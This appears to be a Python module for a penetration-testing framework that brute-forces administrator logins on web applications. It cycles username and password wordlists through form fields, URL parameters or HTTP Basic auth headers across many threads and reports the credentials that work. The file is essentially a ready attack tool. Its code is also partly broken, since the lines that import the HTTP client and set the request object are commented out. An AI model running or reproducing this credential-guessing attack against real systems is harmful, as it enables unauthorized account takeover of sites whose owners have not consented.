#  Copyright 2012 Kid :">

from msf.core.templates import Templates
# from msf.lib.net.http import HTTP
from msf.config import CONFIG
from msf.lib.file import full_path, read_from_file
from msf.lib.thread import Thread

from base64 import b64encode
from time import sleep
from urllib.parse import quote_plus, unquote
from copy import deepcopy
from re import search

class Module(Templates):
	def __init__(self, *args, **kwargs):
		super().__init__(*args, **kwargs)
		self.version		= 1
		self.author			= [ 'Kid' ]
		self.description 	= 'Brute administrator account'
		self.detailed_description	= 'This module retreives connect with dictionary username and password'
		#########################################
		self.userarg		= '__USER__'
		self.passarg		= '__PASS__'
		#########################################
		self.options.add_string('URL', 'Link login')
		self.options.add_string('DATA', 'Date with POST method', False)
		self.options.add_string('USERNAME', 'Account login', False)
		self.options.add_string('PASSWORD', 'Password login', False)
		self.options.add_path('USERLIST', 'File containing username list', default = CONFIG.DATA_PATH + '/brute/username.lst')
		self.options.add_path('PASSLIST', 'File containing password list', default = CONFIG.DATA_PATH + '/brute/pass.vn')
		self.options.add_string('CHECKTYPE', 'Type of checker success login', default = 'errorstr', complete = ['errorstr', 'successstr', 'status', 'author','lenght'])
		self.options.add_string('TOKEN', 'Error/Success string', False)
		self.options.add_integer('THREADS', 'Multithreading', default = 10)
		self.options.add_boolean('VERBOSE', 'Verbose', default = True)

		self.advanced_options.add_string('COOKIE', 'Cookie', False)
		self.advanced_options.add_integer('DELAY', 'Delay time if thread = 1', default = 1)
		self.advanced_options.add_integer('TIMEOUT', 'Time out request', default = CONFIG.TIME_OUT)
		self.advanced_options.add_boolean('STOP', 'Stop scanning host after first valid username/password found', default = True)
		####
		self.initcallbacker	= None

	def run(self, frmwk, args):
		self.frmwk				= frmwk
		# self.victim				= HTTP(self.options['URL'], timeout = self.advanced_options['TIMEOUT'])
		self.victim.storecookie	= True
		self.verbose 			= self.options['VERBOSE']

		self.userlist			= []
		self.passlist			= []
		self.success			= []

		self.victim.headers.update({'Cookie': self.advanced_options['COOKIE']} if self.advanced_options['COOKIE'] else {})
		#######################################
		if self.options['USERNAME']:
			self.userlist	= self.options['USERNAME'].split(',')
		else:
			self.userlist 	= read_from_file(full_path(self.options['USERLIST']))

		if self.options['PASSWORD']:
			self.passlist	= self.options['PASSWORD'].split(',')
		else:
			self.passlist	= read_from_file(full_path(self.options['PASSLIST']))

		self.lenuser	= len(self.userlist)
		self.lenpass	= len(self.passlist)
		###############################################
		listthread	= []
		if len(self.userlist) > 0:
			self.temppass	= []
			for i in range(self.options['THREADS']):
				t	= Thread(target = self.worker)
				listthread.append(t)
				t.start()
			try:
				for t in listthread:
					t.join()
			except KeyboardInterrupt:
				for t in listthread:
					if t.isAlive():
						t.terminate()
				pass
			##############################################
			self.success = sorted(self.success)
			self.frmwk.print_line()
			self.frmwk.print_status("List login:\n-----------")
			if len(self.success) > 0:
				for u, p in self.success:
					self.frmwk.print_success('SUCCESS:	username: {0:<20} password: {1}'.format(u, p))
			self.frmwk.print_status("-----------")
		else:
			self.frmwk.print_status('Nothing to do!')
	
	def worker(self):
		victim		= deepcopy(self.victim)
		url 		= self.options['URL']
		postdata	= self.options['DATA']

		if self.initcallbacker:
			result = self.initcallbacker()
			if result:
				if result[0]:
					url = result[0]
				if result[1]:
					victim.headers.update(result[1])
				if result[2]:
					postdata = result[2]
				del result
			else:
				self.frmwk.print_error('Init false!')
				return
		while len(self.userlist) > 0:
			if len(self.temppass) == 0:
				self.temppass	= self.passlist + []
			################################################
			while len(self.temppass) > 0:
				if len(self.userlist) > 0:
					username	= quote_plus(self.userlist[0])
				else:
					return
				password	= quote_plus(self.temppass.pop(0))

				if len(self.temppass) == 0:
					del self.userlist[0]
				################################################
				if self.options['CHECKTYPE'] == 'author':
					tempurl		= url
					victim.headers.update({'Authorization': "Basic " + b64encode((unquote(username) + ':' + unquote(password)).encode('ascii')).decode('utf-8')})
					data		= victim.Request(tempurl)
				elif postdata:
					tempurl		= url
					tempdata	= postdata.replace(self.userarg , username).replace(self.passarg , password)
					data		= victim.Request(tempurl, 'POST', tempdata)
				else:
					tempurl		= url.replace(self.userarg , username).replace(self.passarg , password)
					data		= victim.Request(tempurl)
				
				username	= unquote(username)
				password	= unquote(password)
				check		= 'FAILURE'
				printer		= self.frmwk.print_status
				if not self.checker(victim):
					self.success.append([username , password])
					self.temppass	= []
					victim			= deepcopy(self.victim)
					check			= 'SUCCESS'
					printer			= self.frmwk.print_success

				percent	= 100 - int((self.lenpass * len(self.userlist))*100/(self.lenuser * self.lenpass))

				if self.verbose == True:
					printer('[{0:d}%] {1}:	Username: {2:<20} Password: {3}'.format(percent, check, username, password))
				else:
					self.frmwk.print_process(percent)
				
				if self.advanced_options['STOP'] and len(self.success) > 0:
					return
				
				if check == 'SUCCESS':
					break

				if self.advanced_options['DELAY'] and self.options['THREADS'] == 1:
					sleep(self.advanced_options['DELAY'])
			################################################
	def checker(self, victim):
		token		= self.options['TOKEN']
		checktype	= self.options['CHECKTYPE']
		if checktype == 'errorstr':
			if search(token,victim.result):
				return True
			return False
		elif checktype == 'successstr':
			if search(token,victim.result):
				return False
			return True
		elif checktype == 'status':
			if str(victim.response.status) in token.split(','):
				return True
			return False
		elif checktype == 'author':
			if victim.response.status == 401:
				return True
			return False
		elif checktype == 'lenght':
			if len(victim.result) - int(token) < 50:
				return True
			return False
